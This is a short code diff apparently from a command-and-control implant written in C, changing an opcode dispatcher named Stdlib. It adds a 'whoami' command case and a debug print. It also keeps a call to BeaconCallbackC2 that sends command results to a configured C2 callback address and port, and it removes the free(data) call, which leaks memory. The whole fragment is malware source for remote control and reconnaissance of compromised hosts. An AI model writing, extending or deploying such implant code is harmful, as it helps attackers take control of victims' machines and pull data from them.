@@ -499,13 +499,16 @@ BOOL Stdlib(char* Buffer)
         data = changedir(args);
         break;
     
+    case 0x7000:
+        data = whoami(args);
+        break;
+    
     default:
         break;
     }
 
+    printf("calling back\n");
     BeaconCallbackC2(_C2_CALLBACK_ADDRESS, _C2_CALLBACK_PORT, _CALLBACK_USER_AGENT, &rOpCode, data, DO_CALLBACK, strlen(data));
-
-    free(data);
     
     return TRUE;
 }
